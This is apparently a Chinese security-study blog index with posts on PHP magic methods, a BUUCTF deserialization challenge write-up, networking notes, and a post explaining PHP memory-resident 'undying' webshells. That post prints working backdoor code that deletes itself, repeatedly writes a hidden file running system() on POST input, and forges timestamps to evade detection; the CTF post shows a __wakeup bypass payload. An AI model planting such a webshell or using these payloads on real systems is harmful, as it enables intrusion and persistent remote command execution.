<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Hexo"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Hexo"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>Hexo</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.4.0"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">Hexo</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/08/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">
                PHP魔术方法
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-08-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">TOC</a></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法，这些方法在PHP中充当了举足轻重的作用，它们服务于类和对象。</p>
<h2 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h2><p>PHP虽然是面向对象的语言，但是一些面向对象的标准并不完善，例如重载（函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法），我们可以通过一些魔术方法弥补。</p>
<h2 id="魔术方法详细解释"><a href="#魔术方法详细解释" class="headerlink" title="魔术方法详细解释"></a>魔术方法详细解释</h2><p><strong>__construct()，类的构造函数<br>__destruct()，类的析构函数<br>__call()，在对象中调用一个不可访问方法时调用<br>__callStatic()，用静态方式中调用一个不可访问方法时调用<br>__get()，获得一个类的成员变量时调用<br>__set()，设置一个类的成员变量时调用<br>__sleep()，执行serialize()时，先会调用这个函数<br>__wakeup()，执行unserialize()时，先会调用这个函数<br>__toString()，类被当成字符串时的回应方法<br>__invoke()，调用函数的方式调用一个对象时的回应方法<br>__set_state()，调用var_export()导出类时，此静态方法会被调用。<br>__clone()，当对象复制完成时调用</strong></p>
<p>一、__construct()，类的构造函数、__destruct()，类的析构函数<br>__construct 构造方法，当一个对象创建时调用此方法，而__destruct()是在一个对象销毁时调用，也就是PHP的gc机制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileRead</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> protected $handle = NULL;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $this-&gt;handle = fopen(...);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  fclose($this-&gt;handle);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>二、__call()、__callStatic()<br>当使用这些未定义的方法时就会进入这两个函数中。比如说我们调用$ a-&gt;b();这个方法，但其实在$a的类模板中并没有b()方法，这时就会进入__call()方法进行处理。__callStatic()则是通过静态调用时如果没有定义对应的方法，就进入到__callStatic()方法中，如A::b()，并没有定义b()方法，这时就进入了__callStatic()中进行处理。<br>三、__set()和__get()<br>__set()和__get()是操作不可访问的属性。注意，这里并不是指没有定义的属性，如果定义为private的属性也可以通过这两个魔术方法来进行定义，当然，也包括未定义的属性。<br>四、__sleep()和__wakeup()<br>当我们在执行serialize()和unserialize()时，会先调用这两个函数。例如我们在序列化一个对象时，这个对象有一个数据库链接，想要在反序列化中恢复链接状态，则可以通过重构这两个函数来实现链接的恢复，<br>这里需要注意的是，__sleep()需要返回一个数组，而这个数组对应着类中的属性名。通常来说，它们可以在序列化前进行数据清理工作，或者反序列化前进行数据的预处理工作。比如序列化前关闭数据库连接或者反序列化前打开数据库连接。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> protected $link;</span><br><span class="line"> private $server, $username, $password, $db;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$server, $username, $password, $db</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;server = $server;</span><br><span class="line">  $this-&gt;username = $username;</span><br><span class="line">  $this-&gt;password = $password;</span><br><span class="line">  $this-&gt;db = $db;</span><br><span class="line">  $this-&gt;connect();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> private <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;link = mysql_connect($this-&gt;server, $this-&gt;username, $this-&gt;password);</span><br><span class="line">  mysql_select_db($this-&gt;db, $this-&gt;link);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  $this-&gt;connect();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>五、__toString()<br>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将出现致命错误。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;this is a object&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> TestClass();</span><br><span class="line">echo $class;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>六、__clone()<br>此方法在复制对象时被调用。我们知道在php中.  $a为一个对象， $b= $a时。 $b为 $ a的引用。当$a发生改变时。 $b也会随之发生变化。那么为了使 $b不发生变化，我们需要用 $b=clone $a;<br>那么，当 $a在调用clone的时候，引擎会自动调用__clone()方法<br>七、Invoke<br>在php中这个方法用于，把对象当方法用的时候。此方法会被调用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoke</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">&#x27;I can run&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$invoke = <span class="keyword">new</span> Invoke();</span><br><span class="line">$invoke();</span><br></pre></td></tr></table></figure>
<p>七、__set_state()<br>了解这个方法前，需要先知道var_export()函数,var_export()和var_dump()类似，输出一个变量的字符串表示。他与var_dump的区别在于它的返回结果的是合法的<br>php代码.此代码可以被eval执行. 注意：此方法是一个静态方法，且在php5.1以上版本才支持。 </p>
<h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><p>一、为什么要绕过__wakeup<br>举个例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    private $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    private $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;username;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;password;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span> $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可知__wakeup将username的值设定为guest，题中需要为admin,而且根据__wake的特性，在反序列化中会提前执行，所以需要绕过<br>二、绕过方法：当成员属性数目大于实际数目时可绕过<br>题目来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53549425/article/details/119293469?spm=1001.2014.3001.5501">buuctf_php</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">
                PHP不死马
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-08-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>内存性木马即不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。内存马是无文件攻击的一种技术手段,那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测,它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具,例如PowerShell,Windows Management Instrumentation(WMI)和PsExec等。无文件攻击技术允许攻击者访问系统,从而启用后续的恶意活动。通过操纵漏洞利用程序、合法工具、宏和脚本,攻击者可以破坏系统、提升特权或在网络上横向传播恶意代码。而且,无文件威胁在执行后不会留下任何痕迹,这使其难以被检测和清除。<br><img src="https://img-blog.csdnimg.cn/7f789ac0abca4ed5bc04ee0452748ca5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在这里我们只介绍PHP内存马。<br>PHP内存马利用脚本解析执行特性，调用PHP运行时文件访问接口动态加载恶意代码，之后调用PHP运行时外部命令执行接口执行恶意代码。</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="https://img-blog.csdnimg.cn/4be572e47cd440a7b25b06afacef60c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>① 当PHP-FPM启用时，通过Fastcgi协议（Fastcgi协议是服务器中间件和后端进行数据交换的协议）向PHP-FPM发起请求执行任意文件。如果PHP-FPM可被外部访问，攻击者通过Fastcgi协议可直接请求PHP-FPM执行”任意文件”。<br><img src="https://img-blog.csdnimg.cn/b9f8ef2c5f2143ba9b955fc3f39b2936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">② 内存驻留Webshell通常会在php执行起来后，删除php文件本体。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(__FILE__);</span><br><span class="line">	$file = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	$code = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents($file, $code);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</p>
<p>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</p>
<p>unlink(<strong>FILE</strong>)删除文件本身，以起到隐蔽自身的作用。</p>
<p>while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</p>
<p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p>
<h2 id="防护原理"><a href="#防护原理" class="headerlink" title="防护原理"></a>防护原理</h2><p>通过对PHP执行进程进行监控，关联分析敏感行为以识别此类攻击</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/08/08/buuctf_php/">
                buuctf_php
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-08-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="buuctf-php"><a href="#buuctf-php" class="headerlink" title="buuctf_php"></a>buuctf_php</h1><p><img src="https://img-blog.csdnimg.cn/83ed7f7f9b4947a98b422d117f12f4f8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们来看下这道题，打开后有提示备份文件，对于备份文件我们可以使用御剑扫描后台目录<br><img src="https://img-blog.csdnimg.cn/b4ec4bc346c84b18a315e7f988807dcc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载这个<a target="_blank" rel="noopener" href="http://www.zip后发现/">www.zip后发现</a><br><img src="https://img-blog.csdnimg.cn/1b9a8035097d49d3a039e87b97e7a05a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有这些文件，首先打开flag.php，发现不是我们想要的flag，所以我们打开class.php，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    private $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    private $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;username;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            echo $this-&gt;password;echo <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span> $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>首先我们注意关于username和password都是private，这个在下面的解答中会用到<br><img src="https://img-blog.csdnimg.cn/bd528dc12f7349cb9d115330f452f4f5.png" alt="在这里插入图片描述"><br>然后打开index.php观察这个代码，由unserialize()知涉及反序列化，再打开class.php<br><img src="https://img-blog.csdnimg.cn/8e60ca21b74e45379725cf6c5620e08f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以知道只有username为admin时且password为100时，才会输出flag<br>而反序列化后调用_wakeup会直接覆盖输入的用户名。一个简单的办法是直接在class下面创建一个对象然后序列化。由此我们可以构造playload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a= new Name(&#x27;admin&#x27;,100);</span><br><span class="line">$b= serialize($a);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>此时我们需要注意两个点，一个是private属性序列化:%00类名%00成员名，所有要在Name、username、以及password前面加%00，另一个是关于_wakeup函数，因为要绕过wakeup,把Name后的数字改成3，**当反序列化时，若属性个数大于真实属性个数时，则会跳过__wakeup()**，本题得解<br><img src="https://img-blog.csdnimg.cn/17a850d19ba44de6bd1e46f0ba2a722a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/08/01/%E8%AE%A1%E7%BD%91%E7%BD%91%E7%BB%9C%E7%AF%87/">
                计网网络篇
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-08-01</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="1-公钥和私钥"><a href="#1-公钥和私钥" class="headerlink" title="1. 公钥和私钥"></a>1. 公钥和私钥</h1><p>公钥和私钥是通过一种算法得到的一个密钥对，公钥是秘钥对中公开的部分，私钥是非公开的部分。如果用其中一个密钥加密一段数据，必须用另一个密钥解密。比如用公钥加密数据就必须用私钥解密，如果用私钥加密也必须用公钥解密，否则解密将不会成功。</p>
<p>原则：公钥公开，私钥只有自己拥有。</p>
<h1 id="2-对称加密与非对称加密"><a href="#2-对称加密与非对称加密" class="headerlink" title="2. 对称加密与非对称加密"></a>2. 对称加密与非对称加密</h1><p>对称密钥加密是指加密和解密使用同一个密钥的方式，这种方式存在的最大问题就是密钥发送问题，即如何安全地将密钥发给对方；</p>
<p>​ 非对称加密是指使用一对非对称密钥，即公钥和私钥，公钥可以随意发布，但私钥只有自己知道。发送密文的一方使用对方的公钥进行加密处理，对方接收到加密信息后，使用自己的私钥进行解密。</p>
<p>​ 由于非对称加密的方式不需要发送用来解密的私钥，所以可以保证安全性；但是和对称加密比起来，它非常的慢，所以我们还是要用对称加密来传送消息，但对称加密所使用的密钥我们可以通过非对称加密的方式发送出去。</p>
<p>总结一下：通过非对称加密的方式把秘钥发送过去，接下来用这个秘钥一直进行对称加密。</p>
<p>即：第一次通信采用非对称加密，接下来的通信采用对称加密</p>
<h1 id="3-HTTP的相关问题"><a href="#3-HTTP的相关问题" class="headerlink" title="3. HTTP的相关问题"></a>3. HTTP的相关问题</h1><p>3.1 HTTP概念<br>HTTP协议：超文本传输协议。是应用层协议，是基于TCP协议的，明文传输，客户端与服务器端都无法验证对方的身份；</p>
<p>超文本：广义上的文本，包括图片、视频、压缩包、超链接等。</p>
<p>3.2 HTTP的特点<br>1、简单、灵活：HTTP头部的各类字段组成都没有固定要求，允许开发人员自定义和补充。</p>
